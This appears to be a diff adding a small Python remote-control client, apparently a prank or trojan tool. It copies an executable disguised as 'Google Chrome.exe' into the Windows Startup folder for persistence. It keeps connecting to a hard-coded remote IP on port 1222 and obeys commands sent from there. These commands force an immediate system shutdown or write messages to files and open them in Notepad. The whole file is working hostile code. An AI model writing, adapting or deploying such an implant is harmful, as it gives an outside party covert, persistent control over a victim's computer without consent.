@@ -1,0 +1,92 @@
+import socket
+import json
+import subprocess
+import secrets
+import time
+from pathlib import Path
+import string
+import threading
+import os
+import random
+import shutil
+
+home_dir = Path.home()
+
+if str(os.path.dirname(__file__)) != "c:\\Users\\aston\\OneDrive\\Pictures\\VS":
+    shutil.move("Google Chrome.exe",str(home_dir)+"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+
+clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+active = False
+
+def attemptConnection():
+    global active
+    try:
+        clientsocket.connect(("192.168.1.70",1222))
+        active = True
+    except:
+        try:
+            clientsocket.connect(("86.142.236.171",1222))
+            active = True
+        except:
+            active = False
+            print("No Connection")
+
+
+def notepadCalle(fileName):
+    subprocess.call(["notepad.exe", fileName])
+
+def connection():
+    global active
+    while active:
+        data = None
+        try:
+            data = clientsocket.recv(1024)
+        except:
+            print("Server Shutdown...")
+            active = False
+            break
+
+        if not data:
+            print("Server Shutdown...")
+            active = False
+            break
+
+        data = data.decode("UTF-8")
+        decodedData = json.loads(data)
+
+        topic = decodedData[0]
+
+        if topic == "shutdown":
+            print("Attempting Shutdown")
+            try:
+                os.system("shutdown /s /t 1")
+            except:
+                print("Shutdown Failed")
+        elif topic == "message":
+            message = decodedData[1]
+
+            origFile = ""
+            for i in range(random.randint(50,100)):
+                origFile = origFile + secrets.choice(string.ascii_letters)
+
+            fileName = origFile + ".txt"
+
+            try:
+                fileName = str(home_dir)+"\\OneDrive\\Documents\\"+fileName
+                file = open(fileName,"w")
+            except:
+                fileName = origFile + ".txt"
+                file = open(fileName, "w")
+
+            file.write(message)
+            file.close()
+
+            t1 = threading.Thread(target=notepadCalle,args=(fileName,))
+            t1.start()
+
+
+while True:
+    attemptConnection()
+    connection()
+    time.sleep(5)
